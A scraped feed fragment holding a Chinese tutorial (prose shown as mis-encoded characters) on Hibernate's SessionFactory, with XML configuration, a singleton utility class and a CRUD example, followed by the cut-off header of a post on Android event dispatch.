            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-27T23:15:44.000Z" title="Sat Dec 27 2025 23:15:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>SessionFactory</code>æ˜¯Hibernateçš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œå®ƒè´Ÿè´£åˆ›å»ºå’Œç®¡ç†Sessionå¯¹è±¡ã€‚<code>SessionFactory</code>æ˜¯ä¸€ä¸ªçº¿ç¨‹å®‰å…¨ï¼ˆthread-safeï¼‰çš„å¯¹è±¡ï¼Œé€šå¸¸åœ¨åº”ç”¨ç¨‹åºåˆå§‹åŒ–æ—¶åˆ›å»ºï¼Œå¹¶åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºè¿è¡ŒæœŸé—´å­˜åœ¨ã€‚æ¯ä¸ªæ•°æ®åº“éœ€è¦ä¸€ä¸ªå”¯ä¸€çš„<code>SessionFactory</code>å®ä¾‹ï¼Œå®ƒå……å½“è¿æ¥æ•°æ®åº“çš„å·¥å‚ã€‚</p>
<h3 data-id="heading-0">ä¸»è¦åŠŸèƒ½</h3>
<ol>
<li><strong>åˆ›å»ºSession</strong>ï¼šè´Ÿè´£åˆ›å»ºæ–°çš„<code>Session</code>å¯¹è±¡ã€‚</li>
<li><strong>ç®¡ç†Session</strong>ï¼šç®¡ç†å·²ç»åˆ›å»ºçš„<code>Session</code>å¯¹è±¡ã€‚</li>
<li><strong>ç¼“å­˜é…ç½®</strong>ï¼šä¸º<code>Session</code>æä¾›äºŒçº§ç¼“å­˜æ”¯æŒã€‚</li>
<li><strong>æ•°æ®åº“è¿æ¥ç®¡ç†</strong>ï¼šç®¡ç†ä¸æ•°æ®åº“çš„è¿æ¥ã€‚</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šé€šè¿‡ç¼“å­˜å’Œè¿æ¥æ± æŠ€æœ¯æé«˜æ€§èƒ½ã€‚</li>
</ol>
<h3 data-id="heading-1">åˆ›å»ºSessionFactory</h3>
<p>é€šå¸¸ï¼Œ<code>SessionFactory</code>ç”±é…ç½®æ–‡ä»¶ï¼ˆå¦‚<code>hibernate.cfg.xml</code>ï¼‰é…ç½®ï¼Œå¹¶åœ¨åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶é€šè¿‡<code>Configuration</code>å¯¹è±¡åˆ›å»ºã€‚</p>
<h4 data-id="heading-2"><code>hibernate.cfg.xml</code> ç¤ºä¾‹</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±»é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Student"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">ä½¿ç”¨SessionFactory</h3>
<p>é€šè¿‡<code>Configuration</code>å¯¹è±¡è¯»å–é…ç½®æ–‡ä»¶å¹¶åˆ›å»º<code>SessionFactory</code>å®ä¾‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶åˆ›å»ºSessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// è®°å½•å¯åŠ¨å¤±è´¥çš„é”™è¯¯</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h3 data-id="heading-4">ä½¿ç”¨Sessionè¿›è¡Œæ“ä½œ</h3>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªå®Œæ•´çš„ä¾‹å­ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨<code>SessionFactory</code>åˆ›å»º<code>Session</code>å¹¶è¿›è¡ŒCRUDæ“ä½œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();
        <span class="hljs-comment">// æ‰“å¼€ä¸€ä¸ªæ–°çš„Session</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();

        <span class="hljs-comment">// å¯åŠ¨äº‹åŠ¡</span>
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();

        <span class="hljs-comment">// åˆ›å»ºå¹¶ä¿å­˜Studentå¯¹è±¡</span>
        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">20</span>);
        session.save(student); <span class="hljs-comment">// ä¿å­˜å¯¹è±¡</span>

        <span class="hljs-comment">// æäº¤äº‹åŠ¡</span>
        transaction.commit();

        <span class="hljs-comment">// é‡æ–°å¼€å§‹ä¸€ä¸ªæ–°çš„äº‹åŠ¡</span>
        transaction = session.beginTransaction();

        <span class="hljs-comment">// è¯»å–Studentå¯¹è±¡</span>
        <span class="hljs-type">Student</span> <span class="hljs-variable">retrievedStudent</span> <span class="hljs-operator">=</span> session.get(Student.class, student.getId());
        System.out.println(<span class="hljs-string">"Retrieved Student: "</span> + retrievedStudent.getName() + <span class="hljs-string">", Age: "</span> + retrievedStudent.getAge());

        <span class="hljs-comment">// æ›´æ–°Studentå¯¹è±¡</span>
        retrievedStudent.setAge(<span class="hljs-number">21</span>);
        session.update(retrievedStudent); <span class="hljs-comment">// æ›´æ–°å¯¹è±¡</span>

        <span class="hljs-comment">// åˆ é™¤Studentå¯¹è±¡</span>
        session.delete(retrievedStudent); <span class="hljs-comment">// åˆ é™¤å¯¹è±¡</span>

        <span class="hljs-comment">// æäº¤äº‹åŠ¡</span>
        transaction.commit();

        <span class="hljs-comment">// å…³é—­Session</span>
        session.close();
        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters å’Œ setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h3 data-id="heading-5">è¯¦ç»†è§£é‡Š</h3>
<ol>
<li><strong>é…ç½®SessionFactory</strong>ï¼šåœ¨<code>HibernateUtil</code>ç±»ä¸­ï¼Œé€šè¿‡<code>Configuration</code>å¯¹è±¡è¯»å–<code>hibernate.cfg.xml</code>é…ç½®æ–‡ä»¶ï¼Œåˆ›å»º<code>SessionFactory</code>å®ä¾‹ã€‚è¿™ä¸ªè¿‡ç¨‹é€šå¸¸åœ¨åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶æ‰§è¡Œï¼Œå¹¶ä¸”<code>SessionFactory</code>åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸä¸­æ˜¯å•ä¾‹çš„ã€‚</li>
<li><strong>è·å–Session</strong>ï¼šé€šè¿‡<code>SessionFactory.openSession()</code>æ–¹æ³•è·å–æ–°çš„<code>Session</code>å¯¹è±¡ã€‚<code>Session</code>å¯¹è±¡ç”¨äºæ‰§è¡ŒCRUDæ“ä½œã€‚</li>
<li><strong>å¯åŠ¨äº‹åŠ¡</strong>ï¼šé€šè¿‡<code>session.beginTransaction()</code>æ–¹æ³•å¯åŠ¨äº‹åŠ¡ã€‚</li>
<li><strong>CRUDæ“ä½œ</strong>ï¼š
<ul>
<li><strong>åˆ›å»ºå¹¶ä¿å­˜å¯¹è±¡</strong>ï¼šä½¿ç”¨<code>session.save(student)</code>æ–¹æ³•å°†å¯¹è±¡æŒä¹…åŒ–åˆ°æ•°æ®åº“ä¸­ã€‚</li>
<li><strong>è¯»å–å¯¹è±¡</strong>ï¼šä½¿ç”¨<code>session.get(Student.class, student.getId())</code>æ–¹æ³•ä»æ•°æ®åº“ä¸­è¯»å–å¯¹è±¡ã€‚</li>
<li><strong>æ›´æ–°å¯¹è±¡</strong>ï¼šä¿®æ”¹å¯¹è±¡å±æ€§åï¼Œä½¿ç”¨<code>session.update(retrievedStudent)</code>æ–¹æ³•æ›´æ–°æ•°æ®åº“ä¸­çš„è®°å½•ã€‚</li>
<li><strong>åˆ é™¤å¯¹è±¡</strong>ï¼šä½¿ç”¨<code>session.delete(retrievedStudent)</code>æ–¹æ³•ä»æ•°æ®åº“ä¸­åˆ é™¤å¯¹è±¡ã€‚</li>
</ul>
</li>
<li><strong>æäº¤äº‹åŠ¡</strong>ï¼šé€šè¿‡<code>transaction.commit()</code>æ–¹æ³•æäº¤äº‹åŠ¡ï¼Œå°†æ‰€æœ‰æ›´æ”¹åŒæ­¥åˆ°æ•°æ®åº“ã€‚</li>
<li><strong>å…³é—­Session</strong>ï¼šé€šè¿‡<code>session.close()</code>æ–¹æ³•å…³é—­<code>Session</code>ã€‚</li>
<li><strong>å…³é—­SessionFactory</strong>ï¼šé€šè¿‡<code>sessionFactory.close()</code>æ–¹æ³•å…³é—­<code>SessionFactory</code>ã€‚</li>
</ol>
<h3 data-id="heading-6">æ€§èƒ½ä¼˜åŒ–</h3>
<p><code>SessionFactory</code>è¿˜æä¾›ä¸€äº›æ€§èƒ½ä¼˜åŒ–åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><strong>äºŒçº§ç¼“å­˜</strong>ï¼šé€šè¿‡é…ç½®äºŒçº§ç¼“å­˜ï¼Œå‡å°‘å¯¹æ•°æ®åº“çš„ç›´æ¥è®¿é—®ï¼Œæé«˜æ€§èƒ½ã€‚</li>
<li><strong>è¿æ¥æ± ç®¡ç†</strong>ï¼šé€šè¿‡é…ç½®è¿æ¥æ± ï¼Œç®¡ç†å’Œä¼˜åŒ–æ•°æ®åº“è¿æ¥çš„ä½¿ç”¨ã€‚</li>
</ul>
<h4 data-id="heading-7">äºŒçº§ç¼“å­˜é…ç½®ç¤ºä¾‹</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- äºŒçº§ç¼“å­˜é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.cache.use_second_level_cache"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.cache.region.factory_class"</span>&gt;</span>org.hibernate.cache.ehcache.EhCacheRegionFactory<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.cache.provider_class"</span>&gt;</span>org.hibernate.cache.EhCacheProvider<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<p>é€šè¿‡ä¸Šè¿°é…ç½®ï¼Œå¯ç”¨Hibernateçš„äºŒçº§ç¼“å­˜æœºåˆ¶ï¼Œå¯ä»¥æ˜¾è‘—æé«˜åº”ç”¨ç¨‹åºæ€§èƒ½ã€‚</p>
<h3 data-id="heading-8">æ€»ç»“</h3>
<p><code>SessionFactory</code>æ˜¯Hibernateçš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œè´Ÿè´£åˆ›å»ºå’Œç®¡ç†<code>Session</code>å¯¹è±¡ï¼Œæä¾›äº†æ•°æ®åº“è¿æ¥ã€ç¼“å­˜ç®¡ç†å’Œæ€§èƒ½ä¼˜åŒ–ç­‰åŠŸèƒ½ã€‚åœ¨ä¸€ä¸ªå…¸å‹çš„Hibernateåº”ç”¨ç¨‹åºä¸­ï¼Œ<code>SessionFactory</code>é€šå¸¸åœ¨åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶åˆå§‹åŒ–ï¼Œå¹¶åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºç”Ÿå‘½å‘¨æœŸä¸­ä½¿ç”¨ã€‚æ­£ç¡®åœ°ä½¿ç”¨<code>SessionFactory</code>å’Œ<code>Session</code>ï¼Œå¯ä»¥æœ‰æ•ˆåœ°è¿›è¡Œæ•°æ®åº“æ“ä½œï¼Œæé«˜åº”ç”¨ç¨‹åºçš„æ€§èƒ½å’Œç¨³å®šæ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android äº‹ä»¶åˆ†å‘æœºåˆ¶ï¼ˆäºŒï¼‰â€”â€” ç‚¹å‡»äº‹ä»¶é€ä¼ ]]></title>    <link>https://juejin.cn/post/7588139768276647987</link>    <guid>https://juejin.cn/post/7588139768276647987</guid>    <pubDate>2025-12-28T14:02:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588139768276647987" data-draft-id="7588084804093526054" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android äº‹ä»¶åˆ†å‘æœºåˆ¶ï¼ˆäºŒï¼‰â€”â€” ç‚¹å‡»äº‹ä»¶é€ä¼ "/> <meta itemprop="keywords" content="Android,æºç ,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-28T14:02:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— é™è¿›åŒ–"/> <meta itemprop="url" content="https://juejin.cn/user/108212996024855"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android äº‹ä»¶åˆ†å‘æœºåˆ¶ï¼ˆäºŒï¼‰â€”â€” ç‚¹å‡»äº‹ä»¶é€ä¼ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/108212996024855/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— é™è¿›åŒ–
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T14:02:38.000Z" title="Sun Dec 28 2025 14:02:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    22
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 